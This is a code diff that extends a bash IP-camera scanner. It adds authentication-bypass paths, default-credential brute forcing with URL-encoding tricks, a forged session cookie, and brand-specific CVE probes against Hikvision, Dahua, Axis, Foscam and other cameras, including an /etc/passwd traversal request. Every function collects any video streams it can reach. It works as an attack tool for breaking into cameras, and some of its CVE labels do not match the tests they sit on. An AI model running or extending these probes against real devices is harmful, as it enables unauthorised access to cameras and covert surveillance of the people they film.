@@ -371,6 +371,307 @@ scan_rtsp(){
   fi
 }
 
+# Revolutionary credential bypass function
+advanced_credential_bypass() {
+  local ip="$1" port="$2"
+  log_debug "Starting advanced credential bypass on $ip:$port"
+  
+  # Common vulnerable paths that bypass authentication
+  local bypass_paths=(
+    "/cgi-bin/authBypass"
+    "/config/getuser?index=0"
+    "/system.ini?loginuse&loginpas"
+    "/get_status.cgi"
+    "/system.cgi?loginuse&loginpas"
+    "/setup/setup_capture.php?user=admin&pass="
+    "/cgi-bin/hi3510/param.cgi?cmd=getuser"
+    "/onvif/device_service"
+    "/rtsp_over_http/"
+    "/cgi-bin/cgiclient.cgi?action=login&user=service&password=service"
+    "/web/cgi-bin/hi3510/param.cgi?cmd=getuser&user=admin"
+    "/cgi-bin/net_jpeg.cgi"
+    "/axis-cgi/mjpg/video.cgi"
+    "/cgi-bin/snapshot.cgi"
+    "/cgi-bin/setup.cgi"
+  )
+  
+  for path in "${bypass_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 3 2>/dev/null)
+    if echo "$response" | grep -q "200 OK\|302 Found\|multipart/x-mixed-replace"; then
+      log "[BYPASS-AUTH] $ip:$port$path - Authentication bypassed!"
+      log_device_info "$ip" "Authentication bypass: $path" "vulnerable_camera"
+      add_stream "http://$ip:$port$path"
+    fi
+  done
+  
+  # Default credential attempts with URL encoding bypasses
+  local default_creds=(
+    "admin:"
+    "admin:admin" 
+    "admin:12345"
+    "admin:password"
+    "root:root"
+    "service:service"
+    "tech:tech"
+    "guest:guest"
+    "user:user"
+    "viewer:viewer"
+    ":"
+    "admin:123456"
+    "admin:admin123"
+    "admin:000000"
+    "admin:1111"
+    "admin:camera"
+    "camera:camera"
+  )
+  
+  # Try bypasses with various encoding tricks
+  for cred in "${default_creds[@]}"; do
+    IFS=: read -r user pass <<< "$cred"
+    
+    # Standard authentication
+    response=$(curl -su "$user:$pass" -I "http://$ip:$port/" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[CRED-BYPASS] $ip:$port - Credentials: $user:$pass"
+      log_device_info "$ip" "Default credentials: $user:$pass" "vulnerable_camera"
+    fi
+    
+    # URL encoding bypass attempts
+    user_encoded=$(printf "%s" "$user" | xxd -p | sed 's/../%&/g')
+    pass_encoded=$(printf "%s" "$pass" | xxd -p | sed 's/../%&/g')
+    
+    response=$(curl -su "$user_encoded:$pass_encoded" -I "http://$ip:$port/" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[ENCODING-BYPASS] $ip:$port - URL-encoded credentials: $user:$pass"
+      log_device_info "$ip" "URL encoding bypass: $user:$pass" "vulnerable_camera"
+    fi
+  done
+  
+  # Cookie-based session bypass
+  response=$(curl -s -H "Cookie: PHPSESSID=admin; user=admin; auth=1" "http://$ip:$port/" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "video\|stream\|camera\|mjpeg"; then
+    log "[COOKIE-BYPASS] $ip:$port - Session cookie bypass successful"
+    log_device_info "$ip" "Cookie authentication bypass" "vulnerable_camera"
+  fi
+  
+  # Common CGI vulnerabilities
+  local vuln_cgis=(
+    "/cgi-bin/CGIProxy.fcgi"
+    "/cgi-bin/viewer.cgi"
+    "/cgi-bin/video.cgi"
+    "/cgi-bin/mjpg/video.cgi"
+    "/cgi-bin/net_jpeg.cgi"
+  )
+  
+  for cgi in "${vuln_cgis[@]}"; do
+    response=$(curl -s "http://$ip:$port$cgi" -m 2 2>/dev/null)
+    if echo "$response" | grep -qi "boundary\|multipart\|video"; then
+      log "[CGI-BYPASS] $ip:$port$cgi - Direct CGI access"
+      log_device_info "$ip" "CGI bypass: $cgi" "vulnerable_camera"
+      add_stream "http://$ip:$port$cgi"
+    fi
+  done
+}
+
+# Brand-specific vulnerability check functions
+check_hikvision_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Hikvision-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2017-7921: Backdoor account
+  response=$(curl -s "http://$ip:$port/Security/users?auth=YWRtaW46MTEK" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "username\|password"; then
+    log "[HIKVISION-CVE-2017-7921] $ip:$port - Backdoor account vulnerability"
+    log_device_info "$ip" "CVE-2017-7921: Backdoor account" "critical_vuln"
+  fi
+  
+  # CVE-2021-36260: Command injection
+  test_path="/SDK/webLanguage?language=../../../../../../../etc/passwd%00"
+  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
+  if echo "$response" | grep -q "root:"; then
+    log "[HIKVISION-CVE-2021-36260] $ip:$port - Command injection vulnerability"
+    log_device_info "$ip" "CVE-2021-36260: Command injection" "critical_vuln"
+  fi
+  
+  # Check for unauthenticated config access
+  config_paths=("/config" "/system.ini" "/davinci.avi")
+  for path in "${config_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[HIKVISION-CONFIG] $ip:$port$path - Unauthenticated config access"
+      log_device_info "$ip" "Unauthenticated config: $path" "config_leak"
+    fi
+  done
+}
+
+check_dahua_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Dahua-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2021-33044: Authentication bypass
+  response=$(curl -s "http://$ip:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "serialNumber\|deviceType"; then
+    log "[DAHUA-CVE-2021-33044] $ip:$port - Authentication bypass"
+    log_device_info "$ip" "CVE-2021-33044: Auth bypass" "critical_vuln"
+  fi
+  
+  # Console access
+  console_paths=("/console" "/cgi-bin/main-cgi" "/cgi-bin/setup.cgi")
+  for path in "${console_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[DAHUA-CONSOLE] $ip:$port$path - Console access"
+      log_device_info "$ip" "Console access: $path" "admin_access"
+    fi
+  done
+}
+
+check_axis_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Axis-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2018-10658: Directory traversal
+  test_path="/axis-cgi/param.cgi?action=list&group=root.Image.I0.Appearance"
+  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "root\.Image"; then
+    log "[AXIS-CVE-2018-10658] $ip:$port - Directory traversal"
+    log_device_info "$ip" "CVE-2018-10658: Directory traversal" "high_vuln"
+  fi
+  
+  # Default admin interface
+  admin_paths=("/axis-cgi/admin/param.cgi" "/axis-cgi/mjpg/video.cgi")
+  for path in "${admin_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK\|multipart"; then
+      log "[AXIS-ADMIN] $ip:$port$path - Admin interface access"
+      log_device_info "$ip" "Admin interface: $path" "admin_access"
+      add_stream "http://$ip:$port$path"
+    fi
+  done
+}
+
+check_vivotek_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Vivotek-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2018-11526: Command injection
+  test_path="/cgi-bin/viewer/video.jpg?resolution=1&amp;quality=1&amp;Language=0&amp;Obj0=7373&amp;Obj1=7373"
+  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
+  if echo "$response" | grep -q "JPEG\|image"; then
+    log "[VIVOTEK-CVE-2018-11526] $ip:$port - Potential command injection vector"
+    log_device_info "$ip" "CVE-2018-11526: Command injection vector" "high_vuln"
+  fi
+  
+  # Configuration files
+  config_paths=("/setup/config.xml" "/cgi-bin/admin/getparam.cgi")
+  for path in "${config_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[VIVOTEK-CONFIG] $ip:$port$path - Configuration access"
+      log_device_info "$ip" "Config access: $path" "config_leak"
+    fi
+  done
+}
+
+check_foscam_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Foscam-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2017-2861: Credential exposure
+  response=$(curl -s "http://$ip:$port/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "username\|password\|devInfo"; then
+    log "[FOSCAM-CVE-2017-2861] $ip:$port - Credential exposure"
+    log_device_info "$ip" "CVE-2017-2861: Credential exposure" "critical_vuln"
+  fi
+  
+  # Unauthenticated video access
+  video_paths=("/cgi-bin/CGIStream.cgi?cmd=GetMJStream" "/video.cgi" "/snapshot.cgi")
+  for path in "${video_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "multipart\|image"; then
+      log "[FOSCAM-VIDEO] $ip:$port$path - Unauthenticated video access"
+      log_device_info "$ip" "Unauthenticated video: $path" "video_leak"
+      add_stream "http://$ip:$port$path"
+    fi
+  done
+}
+
+check_dlink_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking D-Link-specific vulnerabilities on $ip:$port"
+  
+  # CVE-2019-10999: Information disclosure
+  response=$(curl -s "http://$ip:$port/config/getuser?index=0" -m 3 2>/dev/null)
+  if echo "$response" | grep -qi "name\|pass"; then
+    log "[DLINK-CVE-2019-10999] $ip:$port - Information disclosure"
+    log_device_info "$ip" "CVE-2019-10999: Info disclosure" "critical_vuln"
+  fi
+  
+  # Common D-Link paths
+  dlink_paths=("/common/info.cgi" "/cgi-bin/view_video.cgi")
+  for path in "${dlink_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[DLINK-ACCESS] $ip:$port$path - D-Link interface access"
+      log_device_info "$ip" "D-Link interface: $path" "admin_access"
+    fi
+  done
+}
+
+check_tplink_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking TP-Link-specific vulnerabilities on $ip:$port"
+  
+  # Check for default credentials and common paths
+  tplink_paths=("/stream/video/mjpeg" "/cgi/ptdc.cgi")
+  for path in "${tplink_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK\|multipart"; then
+      log "[TPLINK-ACCESS] $ip:$port$path - TP-Link interface access"
+      log_device_info "$ip" "TP-Link interface: $path" "admin_access"
+      add_stream "http://$ip:$port$path"
+    fi
+  done
+}
+
+check_sony_vulns() {
+  local ip="$1" port="$2"
+  log_debug "Checking Sony-specific vulnerabilities on $ip:$port"
+  
+  # Sony camera specific paths
+  sony_paths=("/sony/camera" "/command/camera.cgi")
+  for path in "${sony_paths[@]}"; do
+    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+    if echo "$response" | grep -q "200 OK"; then
+      log "[SONY-ACCESS] $ip:$port$path - Sony camera interface"
+      log_device_info "$ip" "Sony interface: $path" "camera_access"
+    fi
+  done
+}
+
+detect_generic_camera() {
+  local ip="$1" port="$2"
+  log_debug "Attempting generic camera detection on $ip:$port"
+  
+  # Generic camera detection patterns
+  response=$(curl -s "http://$ip:$port/" -m 3 2>/dev/null)
+  
+  if echo "$response" | grep -qi "camera\|mjpeg\|rtsp\|onvif\|video"; then
+    log "[GENERIC-CAMERA] $ip:$port - Generic camera interface detected"
+    log_device_info "$ip" "Generic camera interface" "generic_camera"
+    
+    # Try common generic paths
+    generic_paths=("/video" "/mjpeg" "/stream" "/cam" "/camera")
+    for path in "${generic_paths[@]}"; do
+      test_response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
+      if echo "$test_response" | grep -q "multipart\|video\|image"; then
+        log "[GENERIC-STREAM] $ip:$port$path - Video stream found"
+        add_stream "http://$ip:$port$path"
+      fi
+    done
+  fi
+}
+
 # Function to scan HTTP ( for aggressive scanning)
 scan_http(){
   local ip="$1" port="$2"
@@ -446,19 +747,53 @@ scan_http(){
     }
   fi
   
+  # Revolutionary credential bypass techniques
+  advanced_credential_bypass "$ip" "$port"
+  
   #  server fingerprinting
   hdr=$(curl -sI "http://$ip:$port" 2>/dev/null | grep -i '^Server:' | cut -d' ' -f2-)
   if [[ $hdr ]]; then
     cve_check "$hdr"
     
-    # Identify camera brands based on server headers
+    # Enhanced camera brand identification with specific vulnerability checks
     case $hdr in
-      *Hikvision*|*HIKVISION*) log_device_info "$ip" "Hikvision Camera: $hdr" "hikvision_camera" ;;
-      *Dahua*|*DAHUA*) log_device_info "$ip" "Dahua Camera: $hdr" "dahua_camera" ;;
-      *Axis*|*AXIS*) log_device_info "$ip" "Axis Camera: $hdr" "axis_camera" ;;
-      *Vivotek*|*VIVOTEK*) log_device_info "$ip" "Vivotek Camera: $hdr" "vivotek_camera" ;;
-      *Foscam*|*FOSCAM*) log_device_info "$ip" "Foscam Camera: $hdr" "foscam_camera" ;;
-      *) log_device_info "$ip" "HTTP Server: $hdr" "web_server" ;;
+      *Hikvision*|*HIKVISION*) 
+        log_device_info "$ip" "Hikvision Camera: $hdr" "hikvision_camera"
+        check_hikvision_vulns "$ip" "$port"
+        ;;
+      *Dahua*|*DAHUA*) 
+        log_device_info "$ip" "Dahua Camera: $hdr" "dahua_camera"
+        check_dahua_vulns "$ip" "$port"
+        ;;
+      *Axis*|*AXIS*) 
+        log_device_info "$ip" "Axis Camera: $hdr" "axis_camera"
+        check_axis_vulns "$ip" "$port"
+        ;;
+      *Vivotek*|*VIVOTEK*) 
+        log_device_info "$ip" "Vivotek Camera: $hdr" "vivotek_camera"
+        check_vivotek_vulns "$ip" "$port"
+        ;;
+      *Foscam*|*FOSCAM*) 
+        log_device_info "$ip" "Foscam Camera: $hdr" "foscam_camera"
+        check_foscam_vulns "$ip" "$port"
+        ;;
+      *D-Link*|*DLINK*) 
+        log_device_info "$ip" "D-Link Camera: $hdr" "dlink_camera"
+        check_dlink_vulns "$ip" "$port"
+        ;;
+      *TP-Link*|*TPLINK*) 
+        log_device_info "$ip" "TP-Link Camera: $hdr" "tplink_camera"
+        check_tplink_vulns "$ip" "$port"
+        ;;
+      *Sony*|*SONY*) 
+        log_device_info "$ip" "Sony Camera: $hdr" "sony_camera"
+        check_sony_vulns "$ip" "$port"
+        ;;
+      *) 
+        log_device_info "$ip" "HTTP Server: $hdr" "web_server"
+        # Generic camera detection based on response patterns
+        detect_generic_camera "$ip" "$port"
+        ;;
     esac
   fi
 
